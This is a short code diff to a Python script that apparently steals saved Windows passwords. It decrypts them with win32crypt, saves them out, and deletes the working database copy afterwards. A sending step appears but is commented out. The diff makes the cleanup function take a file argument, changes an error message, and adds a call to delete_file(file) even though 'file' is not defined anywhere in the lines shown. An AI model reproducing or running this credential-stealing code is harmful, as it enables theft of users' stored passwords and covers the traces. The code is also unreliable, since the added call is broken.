@@ -10,9 +10,9 @@ import win32crypt
 import sys
 
 
-def delete_file():
+def delete_file(file):
     try:
-        os.remove("data.db")
+        os.remove(file)
         #os.remove("passwords.txt")
     except:
         pass
@@ -95,7 +95,7 @@ def decrypt_password(password, key):
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
-            return "Password could not be decrypted"
+            return "Password could not be decrypted or none were found!"
 
 def save_passwords(db_dir, key_dir):
     try:
@@ -131,6 +131,7 @@ def save_passwords(db_dir, key_dir):
 
     cursor.close()
     db.close()
+    delete_file(file)
     #send()
 
 save_passwords(load_path("db"), load_path("dir"))
